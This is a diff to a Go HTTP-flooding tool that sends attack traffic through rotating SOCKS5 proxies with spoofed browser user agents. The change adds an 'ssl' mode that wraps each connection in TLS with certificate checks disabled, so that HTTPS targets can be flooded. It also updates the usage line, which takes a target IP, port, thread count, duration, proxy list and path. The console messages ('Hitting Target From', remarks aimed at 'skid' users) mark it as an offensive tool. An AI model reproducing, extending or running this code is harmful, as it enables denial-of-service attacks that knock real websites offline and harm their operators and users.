@@ -9,7 +9,7 @@ package main
 
 import (
 	"bufio"
-        //"crypto/tls"
+        "crypto/tls"
 	"fmt"
 	"io"
 	"math/rand"
@@ -24,7 +24,6 @@ import (
 var (
 	socks_list = make([]string, 0, 4)
 	start      = make(chan bool)
-	arguments = strconv.Itoa(rand.Intn(10000000000000))
 	UserAgents = []string{
 		"Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
 		"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
@@ -150,6 +149,7 @@ func flood() {
 	for {
 		socks_addr := socks_list[rand.Intn(len(socks_list))]
 		socks, err := proxy.SOCKS5("tcp", socks_addr, nil, proxy.Direct)
+
 		if err != nil {
 			fmt.Fprintln(os.Stderr, "Can't connect to the proxy:", err)
 			continue
@@ -164,11 +164,15 @@ func flood() {
 		for {
 			s, err = socks.Dial("tcp", addr)
 
+
 			if err != nil {
 				fmt.Println("Connection Down!!!  | " + socks_addr) //for those who need share with skid
 				break
 			} else {
 				defer s.Close()
+				if os.Args[7] == "ssl" {
+    					s = tls.Client(s, &tls.Config{ServerName: ip,InsecureSkipVerify: true,})
+				}
 				fmt.Println("Hitting Target From | " + socks_addr) //for those who need share with skid
 				for i := 0; i < 100; i++ {
 					s.Write([]byte(request))
@@ -182,8 +186,8 @@ func flood() {
 func main() {
 	rand.Seed(time.Now().UnixNano())
 	fmt.Println("Maybe i should run away...")
-	if len(os.Args) != 7 {
-		fmt.Println("Usage: ", os.Args[0], "<ip> <port> <threads> <seconds> <list> <path>")
+	if len(os.Args) != 8 {
+		fmt.Println("Usage: ", os.Args[0], "<ip> <port> <threads> <seconds> <list> <path> <plain/ssl>")
 		os.Exit(1)
 	}
 	var threads, _ = strconv.Atoi(os.Args[3])
